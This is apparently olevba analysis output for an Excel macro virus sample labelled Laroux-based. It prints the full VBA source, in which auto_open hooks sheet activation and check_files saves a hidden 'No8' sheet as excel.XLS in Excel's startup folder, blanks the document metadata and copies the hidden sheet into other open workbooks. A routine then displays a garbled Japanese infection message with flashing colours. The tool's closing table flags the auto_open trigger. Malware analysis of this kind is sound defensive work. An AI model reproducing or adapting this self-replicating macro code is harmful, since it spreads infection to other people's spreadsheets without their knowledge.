olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-e26b717c787b642032679b6753702a1bdc9c8e4b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO No8.bas 
in file: Virus.MSExcel.Laroux-based-e26b717c787b642032679b6753702a1bdc9c8e4b - OLE stream: '_VBA_PROJECT_CUR/VBA/No8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 



Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "check_files"
End Sub

Sub check_files()
Attribute check_files.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "excel.XLS")
    If m$ = "excel.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("No8").Visible = True
    Sheets("No8").Select
    Sheets("No8").Copy
    With ActiveWorkbook
        .Title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "excel.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("No8").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "excel.xls!check_files"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "No8" Then
        Workbooks("excel.XLS").Sheets("No8").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("No8").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "excel.xls!check_files"
    Case Else
End Select
End Sub

Sub No8()
    Range("A1").Select
    ActiveCell.FormulaR1C1 = "‚²‚ß‚ñ‚È‚³‚¢ƒEƒCƒ‹ƒX‚ÉŠ´�õ‚³‚¹‚Ü‚µ‚½�B"
    Columns("A:A").EntireColumn.AutoFit
    Columns("A:A").ColumnWidth = 103.88
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 48
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 36
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    Rows("1:1").EntireRow.AutoFit
    Rows("1:1").RowHeight = 42.75
    Range("A1").Select
    With Selection.Interior
        .ColorIndex = 3
        .Pattern = xlSolid
    End With
    Selection.Interior.ColorIndex = 2
    Selection.Interior.ColorIndex = 3
    Selection.Interior.ColorIndex = 2
    Selection.Interior.ColorIndex = 5
    Selection.Interior.ColorIndex = 4
    Selection.Interior.ColorIndex = 6
    Selection.Interior.ColorIndex = 10
    Selection.Interior.ColorIndex = 9
    Selection.Interior.ColorIndex = 19
    Selection.Interior.ColorIndex = 20
    Selection.Interior.ColorIndex = 3
    Selection.Interior.ColorIndex = 46
    Selection.Interior.ColorIndex = 16
    Selection.Interior.ColorIndex = 15
    Selection.Interior.ColorIndex = 7
    Selection.Interior.ColorIndex = 6
    Selection.Interior.ColorIndex = 2
    Selection.Interior.ColorIndex = 1
    Selection.Interior.ColorIndex = 2
    Selection.Interior.ColorIndex = 4
    Selection.Interior.ColorIndex = 5
    Selection.Interior.ColorIndex = 2
    Selection.Interior.ColorIndex = 19
    Selection.Interior.ColorIndex = 20
    Selection.Interior.ColorIndex = 2
    Selection.Interior.ColorIndex = 13
    Selection.Interior.ColorIndex = 2
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 28
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 26
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 24
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 22
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 20
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 18
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 16
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 14
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 12
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 11
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 10
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 72
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 48
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 36
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 18
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 36
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 18
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 36
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 22
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    With Selection.Font
        .Name = "‚l‚r ‚oƒSƒVƒbƒN"
        .Size = 36
        .Strikethrough = False
        .Superscript = False
        .Subscript = False
        .OutlineFont = False
        .Shadow = False
        .Underline = xlNone
        .ColorIndex = xlAutomatic
    End With
    Selection.Interior.ColorIndex = 19
    Selection.Borders(xlLeft).LineStyle = xlNone
    Selection.Borders(xlRight).LineStyle = xlNone
    Selection.Borders(xlTop).LineStyle = xlNone
    Selection.Borders(xlBottom).LineStyle = xlNone
    Selection.BorderAround Weight:=xlMedium, ColorIndex:=xlAutomatic
    Range("A3").Select
End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     11 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  No
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
' 0085     16 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sophos 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

